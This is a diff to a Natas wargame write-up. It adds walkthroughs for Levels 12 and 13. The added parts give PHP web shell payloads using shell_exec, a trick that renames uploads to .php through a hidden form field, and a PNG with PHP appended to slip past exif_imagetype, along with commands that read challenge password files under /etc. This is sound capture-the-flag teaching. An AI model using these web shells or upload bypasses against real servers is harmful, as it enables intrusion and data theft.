@@ -20,6 +20,7 @@ Please use these as hints to solve the challenges yourself. Do not use them to c
 - [Level 10](#level10)
 - [Level 11](#level11) 
 - [Level 12](#level12) 
+- [Level 13](#level13) 
 
 ## Level 0 <a name="level0"></a>
 Level 0 is pretty straight-foward. After logging into the level using the password `natas0`, we get the following screen:
@@ -514,9 +515,9 @@ $d = array( "showpassword" => "no", "bgcolor" => "#ffffff");
 echo base64_encode(json_encode($d));
 ?>
 ```
-What we get is the $\text{ciphertext}=$`eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=`. Using an online encoder, we can XOR the two and get the key used: <br>
-`HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=` ⊕ `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=` $=$ `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq` <br>
-Since XOR repeats the key for the size of the input, we have `$key =  qw8J`. Editing the code for the encryption function, we can now generate a new cookie that has `"showpassword" => "yes"`:
+What we get is the $\text{ciphertext}=$`eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=`. Using an online encoder (I highly suggest [this one](https://gchq.github.io/CyberChef/)), we can XOR the two and get the key used: <br>
+`HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=` ⊕ `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=` $=$ `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe` <br>
+Since XOR repeats the key for the size of the input, we have `$key =  eDWo`. Editing the code for the encryption function, we can now generate a new cookie that has `"showpassword" => "yes"`:
 ```php
 <?php
 function xor_encrypt($in) {
@@ -535,7 +536,7 @@ $d = array( "showpassword" => "yes", "bgcolor" => "#ffffff");
 echo base64_encode(xor_encrypt(json_encode($d)));
 ?>
 ```
-The new cookie generated is `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`. This cookie has the option to show the password, so when we add it to the request header like `data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`, we get the solution:
+The new cookie generated is `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`. This cookie has the option to show the password, so when we add it to the request header like `data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`, we get the solution:
 ```html
 <html>
     <head>
@@ -546,8 +547,8 @@ The new cookie generated is `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxF
     <div id="content">
         <body style="background: #ffffff;">
                 Cookies are protected with XOR encryption<br/><br/>
+                
                 The password for natas12 is ****
-
                 <form>
                         Background color: <input name=bgcolor value="#ffffff">
                         <input type=submit value="Set color">
@@ -564,6 +565,192 @@ Landing on the site, we see this:
 
 ![Level 12](/imgs/lvl12/screenshot.png)
 
+We can browse our files, and then upload one onto the server at the `/upload/` folder. The problem is, the name is jangled in the code via a random name generator:
+```php
+`<?php  
+  
+function genRandomString() {  
+	$length = 10;  
+	$characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
+	$string = "";  
+  
+	for ($p = 0; $p < $length; $p++) {  
+		$string .= $characters[mt_rand(0, strlen($characters)-1)];  
+	}  
+  
+	return $string;  
+}  
+  
+function makeRandomPath($dir, $ext) {  
+	do {  
+		$path = $dir."/".genRandomString().".".$ext;  
+	} while(file_exists($path));  
+		return $path;  
+}  
+  
+function makeRandomPathFromFilename($dir, $fn) {  
+	$ext = pathinfo($fn, PATHINFO_EXTENSION);  
+	return makeRandomPath($dir, $ext);  
+}  
+  
+if(array_key_exists("filename", $_POST)) {  
+	$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
+  
+  
+	if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
+		echo "File is too big";  
+	} else {  
+		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
+			echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
+		} else{  
+			echo "There was an error uploading the file, please try again!";  
+		}  
+	}  
+} else {  
+?>
+<form enctype="multipart/form-data" action="index.php" method="POST">  
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
+Choose a JPEG to upload (max 1KB):<br/>  
+<input name="uploadedfile" type="file" /><br />  
+<input type="submit" value="Upload File" />  
+</form>  
+<?php } ?>
+```
+Focusing too much on decrypting the random name generator is just wasting time. But if one looks closer, we see we have no restriction on what we can send as file. <br>
+This immediately rings a bell, as this is a simple [web shell attack](https://en.wikipedia.org/wiki/Web_shell), where we upload a file with malicious code, that'll run on the server-side of the web app. Let's try it right away... We're going to create a file (since the server runs PHP commands, it's a PHP script) that'll print us something to make sure we can execute code:
+`shell.php`
+```
+<?php 
+	$output = shell_exec('pwd');  
+	echo $output;
+?>
+```
+Okay, let's feed it into the web app...
+![Shell](/imgs/lvl12/shell.png)
+While we're fine with another name, the server does have some restriction (although very minimal) to files, since it automatically changes them to `.jpg` by default. We need to circumvent how files are named to actually execute server-side code. <br>
+If one looks closer at the HTML code this time, we see something hidden in plain sight:
+```html
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+```
+There are two hidden input fields, that actually display vital information we can manipulate. In the Developer Tools[^1], we can edit the HTML code to show them:
+![Hidden fields](/imgs/lvl12/hidden.png)
+While we don't care about the size, we can manipulate the files name via the input field. That's great news since that's what we wanted. Now let's change the file type to `.php` and see what the site responds once we check it out. If all went correctly, it should display the current working directory: 
+![pwd](/imgs/lvl12/pwd.png)
+And in fact it does! That's great news. Now we can use this to our advantage to get the next level's password by navigating the web server just like how we did in [Level 7](#level7), [Level 9](#level9) and [Level 10](#level10). Modifing the `shell.php` script to move to the solution path is relatively easy (after some trial and error):
+```php
+<?php 
+	$output = shell_exec('cat ../../../../../etc/natas_webpass/natas13');  
+	echo $output;
+?>
+```
+
+## Level 13 <a name="level13"></a>
+Landing on the site, we see this:
+
+![Level 13](/imgs/lvl13/screenshot.png)
+
+Now things get trickier... We cannot pass anything except a `.jpg` file. Or at least, that's what the web site wants us to think:
+```php
+`<?php  
+  
+function genRandomString() {  
+	$length = 10;  
+	$characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
+	$string = "";  
+  
+	for ($p = 0; $p < $length; $p++) {  
+		$string .= $characters[mt_rand(0, strlen($characters)-1)];  
+	}  
+  
+	return $string;  
+}  
+  
+function makeRandomPath($dir, $ext) {  
+	do {  
+		$path = $dir."/".genRandomString().".".$ext;  
+	} while(file_exists($path));  
+	return $path;  
+}  
+  
+function makeRandomPathFromFilename($dir, $fn) {  
+	$ext = pathinfo($fn, PATHINFO_EXTENSION);  
+	return makeRandomPath($dir, $ext);  
+}  
+  
+if(array_key_exists("filename", $_POST)) {  
+	$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
+  
+	$err=$_FILES['uploadedfile']['error'];  
+	if($err){  
+		if($err === 2){  
+			echo "The uploaded file exceeds MAX_FILE_SIZE";  
+		} else{  
+			echo "Something went wrong :/";  
+		}  
+	} else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
+		echo "File is too big";  
+	} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
+		echo "File is not an image";  
+	} else {  
+		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
+			echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
+		} else{  
+			echo "There was an error uploading the file, please try again!";  
+		}  
+	}  
+} else {  
+?>  
+  
+<form enctype="multipart/form-data" action="index.php" method="POST">  
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
+Choose a JPEG to upload (max 1KB):<br/>  
+<input name="uploadedfile" type="file" /><br />  
+<input type="submit" value="Upload File" />  
+</form>  
+<?php } ?>`
+```
+Scary is it sounds, `exif_imagetype($_FILES['uploadedfile']['tmp_name'])` (which is what checks if the file in input is a image or not) is actually pretty flawed. As its [manual](https://www.php.net/manual/en/function.exif-imagetype.php) says:
+> exif_imagetype() reads the first bytes of an image and checks its signature.
+
+Let me rephrase that, so that it's clearer: 
+> exif_imagetype() reads **only** the first bytes of an image and checks its signature
+
+It does not check file type or anything else. Thus, we can use this to our favour and create a fake `.png` file that will execute malicious code inside. But how do we make an image file run code? <br>
+Using some command trickery, we can append PHP comment to a file and then rename it to `.php` as we did in [Level 12](#level12) to execute server-side code. Here are the commands[^3]:
+
+```bash
+cp /random/file.png .		# <- copy a random png file to working directory
+mv file.png shell.png		# rename because it's cooler B)
+convert -resize 9x9 shell.png shell.png		# <- resize the image so that we don't exceed size limits. 
+echo '<?php $output = shell_exec("pwd"); echo $output; ?>' >> shell.png # append our malicious code to the image
+mv shell.png shell.php		# change file type
+``` 
+
+One may ask: why all of this if we get at the end a `.php` file? Well, since we started with a `.png`, the first few bytes read by `exif_imagetype()` fool it to think it's an image, while the rest of our code is further down the file. <br>
+We can now upload the file (remember to change the file type in the hidden input field) and see what happens:
+![pwd](/imgs/lvl13/pwd.png)
+Ignoring the gibberish in the top, we see our path is `/var/www/natas/natas13/upload`. Same as before, let's change the code so that we can see the password to the next challenge:
+```bash
+# ...
+echo '<?php $output = shell_exec("cat /../../../etc/natas_webpass/natas14"); echo $output; ?>' >> shell.png
+# ...
+```
+
+## Level 14 <a name="level14"></a>
+Landing on the site, we see this:
+
+![Level 14](/imgs/lvl14/screenshot.png)
+
+
 [^1]: I'll be using FireFox, and DevTools and some shortcuts are different from one another, although they're mostly similar in functionality.
 [^2]: It's also written in the [main page](https://overthewire.org/wargames/natas/) of the web challenge, if one doesn't want to use hints.
+[^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose).
+\- `>>` redirect stdout to file.
+\- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for some of the commands and explanations.
+
+
+
 
